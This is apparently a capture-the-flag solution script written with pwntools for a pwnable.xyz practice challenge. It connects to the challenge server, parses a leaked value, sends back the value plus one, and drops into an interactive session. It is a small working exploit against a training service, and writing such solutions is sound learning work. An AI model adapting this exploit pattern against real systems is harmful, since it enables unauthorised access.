# -*- coding: utf-8 -*-
from pwn import *

sh = remote("svc.pwnable.xyz", 30000)
#sh = process("./challenge_21")

# mov BYTE PTR [rbp+rdx*1-0x1], 0x0
# leak  →  0x0000000000000001
sh.recvline()
leak = int(sh.recv().split("0x")[1].split("\n")[0], 16)

print leak
sh.sendline(str(leak + 0x1))
sh.interactive()
